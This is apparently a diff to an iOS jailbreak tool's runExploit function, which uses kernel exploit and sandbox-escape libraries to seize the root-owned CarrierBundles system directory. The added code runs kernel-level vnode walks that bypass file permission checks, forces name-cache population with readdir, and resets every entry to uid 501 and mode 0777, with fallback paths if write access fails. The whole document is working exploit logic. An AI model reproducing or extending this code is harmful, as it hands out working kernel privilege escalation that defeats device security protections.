@@ -8,6 +8,7 @@
 
 #include "kexploit/kexploit_opa334.h"
 #include "kexploit/kutils.h"
+#include "kexploit/vnode.h"
 #include "sandbox_escape.h"
 #include "apfs_own.h"
 
@@ -652,12 +653,53 @@ static void runExploit(void) {
         NSLog(@"[Tweak] CarrierBundles ownership before: uid=%u gid=%u mode=0%o",
               cbStat.st_uid, cbStat.st_gid, cbStat.st_mode & 0xFFFF);
 
-        // Step 1: Set 0777 on root directory FIRST so userspace tree walk can enter
-        int mret = apfs_mod(cbPath, 0777);
-        NSLog(@"[Tweak] CarrierBundles apfs_mod root to 0777: %s", mret == 0 ? "OK" : "FAILED");
+        // Step 1: Kernel-level root directory takeover.
+        // Uses get_vnode_for_path_kernel which bypasses DAC by walking the
+        // kernel name cache.  This succeeds even on root-owned 0700 directories
+        // that chdir/open would reject.  Sets mode=0777, uid=501, gid=501.
+        long kn = apfs_own_tree_kernel(cbPath, 501, 501);
+        NSLog(@"[Tweak] CarrierBundles initial kernel walk: %ld entries processed", kn);
 
-        // Step 2: Multi-pass userspace tree walk (chown + chmod every entry to 501:501 0777)
-        // Each pass can go deeper as directories get opened up.
+        // Step 2: Force-populate the vnode name cache by opening the directory
+        // and reading all entries.  After Step 1 the root has mode=0777 so
+        // opendir/readdir works.  Each readdir() call populates the kernel's
+        // name cache for the directory's children.
+        {
+            DIR *populateDir = opendir(cbPath);
+            if (populateDir) {
+                struct dirent *de;
+                while ((de = readdir(populateDir)) != NULL) {
+                    // readdir forces a vnode lookup, populating the name cache.
+                    // Build the full path to also populate deeper entries.
+                    if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0) continue;
+                    char childPath[PATH_MAX];
+                    snprintf(childPath, sizeof(childPath), "%s/%s", cbPath, de->d_name);
+                    struct stat childStat;
+                    if (stat(childPath, &childStat) == 0 && S_ISDIR(childStat.st_mode)) {
+                        // Recurse one level to populate grandchildren too
+                        DIR *subDir = opendir(childPath);
+                        if (subDir) {
+                            struct dirent *subDe;
+                            while ((subDe = readdir(subDir)) != NULL) { /* populates cache */ }
+                            closedir(subDir);
+                        }
+                    }
+                }
+                closedir(populateDir);
+                NSLog(@"[Tweak] CarrierBundles name cache populated via readdir");
+            } else {
+                NSLog(@"[Tweak] Could not opendir %s after kernel takeover (errno=%d)", cbPath, errno);
+            }
+        }
+
+        // Step 3: Kernel walk again — now the name cache has all children,
+        // so every file/dir inside CarrierBundles gets uid=501, gid=501, mode=0777.
+        kn = apfs_own_tree_kernel(cbPath, 501, 501);
+        NSLog(@"[Tweak] CarrierBundles second kernel walk: %ld entries processed", kn);
+
+        // Step 4: Multi-pass userspace tree walk (chown + chmod every entry).
+        // After kernel steps 1-3, all entries should be 0777, so this is a
+        // verification pass that also catches any stragglers.
         long total = 0;
         for (int pass = 0; pass < 10; pass++) {
             long n = apfs_own_tree(cbPath, 501, 501);
@@ -667,10 +709,10 @@ static void runExploit(void) {
         }
         NSLog(@"[Tweak] CarrierBundles apfs_own_tree multi-pass: %ld total entries", total);
 
-        // Step 3: Kernel-level fallback via vnode name cache — bypasses DAC entirely
-        // This catches any entries the userspace walk couldn't access.
-        long kn = apfs_own_tree_kernel(cbPath, 501, 501);
-        NSLog(@"[Tweak] CarrierBundles kernel walk: %ld additional entries processed", kn);
+        // Step 5: Final kernel-level fallback — catches any entries the
+        // userspace walk couldn't modify due to per-entry DAC restrictions.
+        kn = apfs_own_tree_kernel(cbPath, 501, 501);
+        NSLog(@"[Tweak] CarrierBundles final kernel walk: %ld entries processed", kn);
     }
 
     // Verify write access: try to create a test file inside CarrierBundles
@@ -686,9 +728,21 @@ static void runExploit(void) {
         NSLog(@"[Tweak] *** CarrierBundles write access FAILED (errno=%d: %s) *** "
               "uid=%d euid=%d gid=%d egid=%d",
               errno, strerror(errno), getuid(), geteuid(), getgid(), getegid());
-        // Final fallback: force kernel walk + write test
-        long kn = apfs_own_tree_kernel(cbPath, 501, 501);
-        NSLog(@"[Tweak] Final fallback kernel walk: %ld entries", kn);
+        // Final fallback: kernel-level path resolution + kernel walk
+        // get_vnode_for_path_kernel bypasses DAC entirely, unlike
+        // get_vnode_for_path_by_chdir/open which fail on restricted paths.
+        {
+            uint64_t rv = get_vnode_for_path_kernel(cbPath);
+            if (rv != (uint64_t)-1 && rv != 0) {
+                // Populate name cache then kernel walk
+                DIR *pd = opendir(cbPath);
+                if (pd) { struct dirent *de; while ((de = readdir(pd)) != NULL) {} closedir(pd); }
+                long kn = apfs_own_tree_kernel(cbPath, 501, 501);
+                NSLog(@"[Tweak] Final fallback kernel walk: %ld entries", kn);
+            } else {
+                NSLog(@"[Tweak] Final fallback: get_vnode_for_path_kernel also failed");
+            }
+        }
 
         tf = open(testPath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
         if (tf >= 0) {
